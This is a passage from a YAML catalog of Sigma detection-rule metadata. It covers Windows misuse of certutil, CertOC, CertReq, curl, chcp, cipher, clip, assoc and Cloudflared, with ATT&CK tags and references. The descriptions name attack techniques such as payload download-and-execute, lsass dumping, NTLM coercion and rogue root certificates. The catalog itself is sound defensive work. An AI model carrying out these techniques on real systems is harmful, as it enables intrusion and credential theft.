  - https://web.archive.org/web/20170715043507/http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html
  - https://twitter.com/nas_bench/status/1534957360032120833
  false_positives:
  - Legitimate use of debugging tools
  notes: ''
- detection_id: ff992eac-6449-4c60-8c1d-91c9722a1d48
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_certmgr_certificate_installation.yml
  name: New Root Certificate Installed Via CertMgr.EXE
  description: 'Detects execution of "certmgr" with the "add" flag in order to install
    a new certificate on the system.

    Adversaries may install a root certificate on a compromised system to avoid warnings
    when connecting to adversary controlled web servers.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1553.004
  tags:
  - attack.defense-evasion
  - attack.t1553.004
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md
  - https://securelist.com/to-crypt-or-to-mine-that-is-the-question/86307/
  false_positives:
  - Help Desk or IT may need to manually add a corporate Root CA on occasion. Need
    to test if GPO push doesn't trigger FP
  notes: ''
- detection_id: 70ad0861-d1fe-491c-a45f-fa48148a300d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_certoc_download.yml
  name: File Download via CertOC.EXE
  description: Detects when a user downloads a file by using CertOC.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Certoc/
  false_positives:
  - Unknown
  notes: ''
- detection_id: b86f6dea-0b2f-41f5-bdcc-a057bd19cd6a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_certoc_download_direct_ip.yml
  name: File Download From IP Based URL Via CertOC.EXE
  description: Detects when a user downloads a file from an IP based URL using CertOC.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.execution
  - attack.t1105
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Certoc/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 242301bc-f92f-4476-8718-78004a6efd9f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_certoc_load_dll.yml
  name: DLL Loaded via CertOC.EXE
  description: Detects when a user installs certificates by using CertOC.exe to loads
    the target DLL file.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://twitter.com/sblmsrsn/status/1445758411803480072?s=20
  - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-fe98e74189873d6df72a15df2eaa0315c59ba9cdaca93ecd68afc4ea09194ef2
  - https://lolbas-project.github.io/lolbas/Binaries/Certoc/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 84232095-ecca-4015-b0d7-7726507ee793
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_certoc_load_dll_susp_locations.yml
  name: Suspicious DLL Loaded via CertOC.EXE
  description: Detects when a user installs certificates by using CertOC.exe to load
    the target DLL file.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://twitter.com/sblmsrsn/status/1445758411803480072?s=20
  - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-fe98e74189873d6df72a15df2eaa0315c59ba9cdaca93ecd68afc4ea09194ef2
  - https://lolbas-project.github.io/lolbas/Binaries/Certoc/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4480827a-9799-4232-b2c4-ccc6c4e9e12b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_certreq_download.yml
  name: Suspicious CertReq Command to Download
  description: 'Detects a suspicious CertReq execution downloading a file.

    This behavior is often used by attackers to download additional payloads or configuration
    files.

    Certreq is a built-in Windows utility used to request and retrieve certificates
    from a certification authority (CA). However, it can be abused by threat actors
    for malicious purposes.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Certreq/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: d2125259-ddea-4c1c-9c22-977eb5b29cf0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_certutil_certificate_installation.yml
  name: New Root Certificate Installed Via Certutil.EXE
  description: 'Detects execution of "certutil" with the "addstore" flag in order
    to install a new certificate on the system.

    Adversaries may install a root certificate on a compromised system to avoid warnings
    when connecting to adversary controlled web servers.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1553.004
  tags:
  - attack.defense-evasion
  - attack.t1553.004
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md
  false_positives:
  - Help Desk or IT may need to manually add a corporate Root CA on occasion. Need
    to test if GPO push doesn't trigger FP
  notes: ''
- detection_id: cc9cbe82-7bc0-4ef5-bc23-bbfb83947be7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_certutil_decode.yml
  name: File Decoded From Base64/Hex Via Certutil.EXE
  description: Detects the execution of certutil with either the "decode" or "decodehex"
    flags to decode base64 or hex encoded files. This can be abused by attackers to
    decode an encoded payload before execution
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027
  tags:
  - attack.defense-evasion
  - attack.t1027
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
  - https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/
  - https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/
  - https://twitter.com/JohnLaTwC/status/835149808817991680
  - https://learn.microsoft.com/en-us/archive/blogs/pki/basic-crl-checking-with-certutil
  - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 19b08b1c-861d-4e75-a1ef-ea0c1baf202b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_certutil_download.yml
  name: Suspicious Download Via Certutil.EXE
  description: Detects the execution of certutil with certain flags that allow the
    utility to download files.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027
  - T1105
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
  - https://forensicitguy.github.io/agenttesla-vba-certutil-download/
  - https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/
  - https://twitter.com/egre55/status/1087685529016193025
  - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
  - https://www.hexacorn.com/blog/2020/08/23/certutil-one-more-gui-lolbin
  false_positives:
  - Unknown
  notes: ''
- detection_id: 13e6fe51-d478-4c7e-b0f2-6da9b400a829
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_certutil_download_direct_ip.yml
  name: Suspicious File Downloaded From Direct IP Via Certutil.EXE
  description: Detects the execution of certutil with certain flags that allow the
    utility to download files from direct IPs.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027
  - T1105
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
  - https://forensicitguy.github.io/agenttesla-vba-certutil-download/
  - https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/
  - https://twitter.com/egre55/status/1087685529016193025
  - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
  - https://twitter.com/_JohnHammond/status/1708910264261980634
  - https://www.hexacorn.com/blog/2020/08/23/certutil-one-more-gui-lolbin
  false_positives:
  - Unknown
  notes: ''
- detection_id: 42a5f1e7-9603-4f6d-97ae-3f37d130d794
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_certutil_download_file_sharing_domains.yml
  name: Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE
  description: Detects the execution of certutil with certain flags that allow the
    utility to download files from file-sharing websites.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027
  - T1105
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
  - https://forensicitguy.github.io/agenttesla-vba-certutil-download/
  - https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/
  - https://twitter.com/egre55/status/1087685529016193025
  - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
  - https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/
  - https://www.hexacorn.com/blog/2020/08/23/certutil-one-more-gui-lolbin
  false_positives:
  - Unknown
  notes: ''
- detection_id: e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_certutil_encode.yml
  name: File Encoded To Base64 Via Certutil.EXE
  description: Detects the execution of certutil with the "encode" flag to encode
    a file to base64. This can be abused by threat actors and attackers for data exfiltration
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027
  tags:
  - attack.defense-evasion
  - attack.t1027
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
  - https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/
  - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
  false_positives:
  - As this is a general purpose rule, legitimate usage of the encode functionality
    will trigger some false positives. Apply additional filters accordingly
  notes: ''
- detection_id: ea0cdc3e-2239-4f26-a947-4e8f8224e464
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_certutil_encode_susp_extensions.yml
  name: Suspicious File Encoded To Base64 Via Certutil.EXE
  description: Detects the execution of certutil with the "encode" flag to encode
    a file to base64 where the extensions of the file is suspicious
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027
  tags:
  - attack.defense-evasion
  - attack.t1027
  time_window: ''
  references:
  - https://www.virustotal.com/gui/file/35c22725a92d5cb1016b09421c0a6cdbfd860fd4778b3313669b057d4a131cb7/behavior
  - https://www.virustotal.com/gui/file/427616528b7dbc4a6057ac89eb174a3a90f7abcf3f34e5a359b7a910d82f7a72/behavior
  - https://www.virustotal.com/gui/file/34de4c8beded481a4084a1fd77855c3e977e8ac643e5c5842d0f15f7f9b9086f/behavior
  - https://www.virustotal.com/gui/file/4abe1395a09fda06d897a9c4eb247278c1b6cddda5d126ce5b3f4f499e3b8fa2/behavior
  false_positives:
  - Unknown
  notes: ''
- detection_id: 82a6714f-4899-4f16-9c1e-9a333544d4c3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_certutil_encode_susp_location.yml
  name: File In Suspicious Location Encoded To Base64 Via Certutil.EXE
  description: Detects the execution of certutil with the "encode" flag to encode
    a file to base64 where the files are located in potentially suspicious locations
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027
  tags:
  - attack.defense-evasion
  - attack.t1027
  time_window: ''
  references:
  - https://www.virustotal.com/gui/file/35c22725a92d5cb1016b09421c0a6cdbfd860fd4778b3313669b057d4a131cb7/behavior
  - https://www.virustotal.com/gui/file/427616528b7dbc4a6057ac89eb174a3a90f7abcf3f34e5a359b7a910d82f7a72/behavior
  - https://www.virustotal.com/gui/file/34de4c8beded481a4084a1fd77855c3e977e8ac643e5c5842d0f15f7f9b9086f/behavior
  - https://www.virustotal.com/gui/file/4abe1395a09fda06d897a9c4eb247278c1b6cddda5d126ce5b3f4f499e3b8fa2/behavior
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3ffd6f51-e6c1-47b7-94b4-c1e61d4117c5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_certutil_export_pfx.yml
  name: Certificate Exported Via Certutil.EXE
  description: Detects the execution of the certutil with the "exportPFX" flag which
    allows the utility to export certificates.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027
  tags:
  - attack.defense-evasion
  - attack.t1027
  time_window: ''
  references:
  - https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html
  false_positives:
  - There legitimate reasons to export certificates. Investigate the activity to determine
    if it's benign
  notes: ''
- detection_id: 6c6d9280-e6d0-4b9d-80ac-254701b64916
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_certutil_ntlm_coercion.yml
  name: Potential NTLM Coercion Via Certutil.EXE
  description: Detects possible NTLM coercion via certutil using the 'syncwithWU'
    flag
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://github.com/LOLBAS-Project/LOLBAS/issues/243
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7090adee-82e2-4269-bd59-80691e7c6338
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_chcp_codepage_lookup.yml
  name: Console CodePage Lookup Via CHCP
  description: Detects use of chcp to look up the system locale value as part of host
    discovery
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1614.001
  tags:
  - attack.discovery
  - attack.t1614.001
  time_window: ''
  references:
  - https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/chcp
  false_positives:
  - During Anaconda update the 'conda.exe' process will eventually execution the 'chcp'
    command.
  - Discord was seen using chcp to look up code pages
  notes: ''
- detection_id: c7942406-33dd-4377-a564-0f62db0593a3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_chcp_codepage_switch.yml
  name: Suspicious CodePage Switch Via CHCP
  description: Detects a code page switch in command line or batch scripts to a rare
    language
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036
  tags:
  - attack.t1036
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/win32/intl/code-page-identifiers
  - https://twitter.com/cglyer/status/1183756892952248325
  false_positives:
  - Administrative activity (adjust code pages according to your organization's region)
  notes: ''
- detection_id: 4b046706-5789-4673-b111-66f25fe99534
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cipher_overwrite_deleted_data.yml
  name: Deleted Data Overwritten Via Cipher.EXE
  description: 'Detects usage of the "cipher" built-in utility in order to overwrite
    deleted data from disk.

    Adversaries may destroy data and files on specific systems or in large numbers
    on a network to interrupt availability to systems, services, and network resources.

    Data destruction is likely to render stored data irrecoverable by forensic techniques
    through overwriting files or data on local and remote drives

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1485
  tags:
  - attack.impact
  - attack.t1485
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1485/T1485.md#atomic-test-3---overwrite-deleted-data-on-c-drive
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4c0aaedc-154c-4427-ada0-d80ef9c9deb6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_citrix_trolleyexpress_procdump.yml
  name: Process Access via TrolleyExpress Exclusion
  description: Detects a possible process memory dump that uses the white-listed Citrix
    TrolleyExpress.exe filename as a way to dump the lsass process memory
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://twitter.com/_xpn_/status/1491557187168178176
  - https://www.youtube.com/watch?v=Ie831jF0bb0
  false_positives:
  - Unknown
  notes: ''
- detection_id: ddeff553-5233-4ae9-bbab-d64d2bd634be
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_clip_execution.yml
  name: Data Copied To Clipboard Via Clip.EXE
  description: Detects the execution of clip.exe in order to copy data to the clipboard.
    Adversaries may collect data stored in the clipboard from users copying information
    within or between applications.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1115
  tags:
  - attack.collection
  - attack.t1115
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/clip
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1115/T1115.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: fadb84f0-4e84-4f6d-a1ce-9ef2bffb6ccd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cloudflared_portable_execution.yml
  name: Cloudflared Portable Execution
  description: 'Detects the execution of the "cloudflared" binary from a non standard
    location.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1090.001
  tags:
  - attack.command-and-control
  - attack.t1090.001
  time_window: ''
  references:
  - https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/do-more-with-tunnels/trycloudflare/
  - https://github.com/cloudflare/cloudflared
  - https://www.intrinsec.com/akira_ransomware/
  - https://www.guidepointsecurity.com/blog/tunnel-vision-cloudflared-abused-in-the-wild/
  - https://github.com/cloudflare/cloudflared/releases
  false_positives:
  - Legitimate usage of Cloudflared portable versions
  notes: ''
- detection_id: 222129f7-f4dc-4568-b0d2-22440a9639ba
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cloudflared_quicktunnel_execution.yml
  name: Cloudflared Quick Tunnel Execution
  description: 'Detects creation of an ad-hoc Cloudflare Quick Tunnel, which can be
    used to tunnel local services such as HTTP, RDP, SSH and SMB.

    The free TryCloudflare Quick Tunnel will generate a random subdomain on trycloudflare[.]com,
    following a call to api[.]trycloudflare[.]com.

    The tool has been observed in use by threat groups including Akira ransomware.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1090.001
  tags:
  - attack.command-and-control
  - attack.t1090.001
  time_window: ''
  references:
  - https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/do-more-with-tunnels/trycloudflare/
  - https://github.com/cloudflare/cloudflared
  - https://www.intrinsec.com/akira_ransomware/
  - https://www.guidepointsecurity.com/blog/tunnel-vision-cloudflared-abused-in-the-wild/
  false_positives:
  - Legitimate usage of Cloudflare Quick Tunnel
  notes: ''
- detection_id: 7050bba1-1aed-454e-8f73-3f46f09ce56a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cloudflared_tunnel_cleanup.yml
  name: Cloudflared Tunnel Connections Cleanup
  description: Detects execution of the "cloudflared" tool with the tunnel "cleanup"
    flag in order to cleanup tunnel connections.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1090
  - T1102
  - T1572
  tags:
  - attack.command-and-control
  - attack.t1102
  - attack.t1090
  - attack.t1572
  time_window: ''
  references:
  - https://github.com/cloudflare/cloudflared
  - https://developers.cloudflare.com/cloudflare-one/connections/connect-apps
  false_positives:
  - Legitimate usage of Cloudflared.
  notes: ''
- detection_id: 9a019ffc-3580-4c9d-8d87-079f7e8d3fd4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cloudflared_tunnel_run.yml
  name: Cloudflared Tunnel Execution
  description: Detects execution of the "cloudflared" tool to connect back to a tunnel.
    This was seen used by threat actors to maintain persistence and remote access
    to compromised networks.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1090
  - T1102
  - T1572
  tags:
  - attack.command-and-control
  - attack.t1102
  - attack.t1090
  - attack.t1572
  time_window: ''
  references:
  - https://blog.reconinfosec.com/emergence-of-akira-ransomware-group
  - https://github.com/cloudflare/cloudflared
  - https://developers.cloudflare.com/cloudflare-one/connections/connect-apps
  false_positives:
  - Legitimate usage of Cloudflared tunnel.
  notes: ''
- detection_id: 3d3aa6cd-6272-44d6-8afc-7e88dfef7061
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_assoc_execution.yml
  name: Change Default File Association Via Assoc
  description: 'Detects file association changes using the builtin "assoc" command.

    When a file is opened, the default program used to open the file (also called
    the file association or handler) is checked. File association selections are stored
    in the Windows Registry and can be edited by users, administrators, or programs
    that have Registry access or by administrators using the built-in assoc utility.
    Applications can modify the file association for a given file extension to call
    an arbitrary program when a file with the given extension is opened.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.001/T1546.001.md
  false_positives:
  - Admin activity
  notes: ''
- detection_id: ae6f14e6-14de-45b0-9f44-c0986f50dc89
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_assoc_tamper_exe_file_association.yml
  name: Change Default File Association To Executable Via Assoc
  description: 'Detects when a program changes the default file association of any
    extension to an executable.

    When a file is opened, the default program used to open the file (also called
    the file association or handler) is checked. File association selections are stored
    in the Windows Registry and can be edited by users, administrators, or programs
    that have Registry access or by administrators using the built-in assoc utility.
    Applications can modify the file association for a given file extension to call
    an arbitrary program when a file with the given extension is opened.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/assoc
  false_positives:
  - Unknown
  notes: ''
- detection_id: 044ba588-dff4-4918-9808-3f95e8160606
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_copy_dmp_from_share.yml
  name: Copy .DMP/.DUMP Files From Remote Share Via Cmd.EXE
  description: Detects usage of the copy builtin cmd command to copy files with the
    ".dmp"/".dump" extension from a remote share
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.credential-access
  time_window: ''
  references:
  - https://thedfirreport.com/2022/09/26/bumblebee-round-two/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 21dd6d38-2b18-4453-9404-a0fe4a0cc288
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_curl_download_exec_combo.yml
  name: Curl Download And Execute Combination
  description: Adversaries can use curl to download payloads remotely and execute
    them. Curl is included by default in Windows 10 build 17063 and later.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://medium.com/@reegun/curl-exe-is-the-new-rundll32-exe-lolbin-3f79c5f35983
  false_positives:
  - Unknown
  notes: ''
- detection_id: 379fa130-190e-4c3f-b7bc-6c8e834485f3
  source_id: sigmahq_sigma
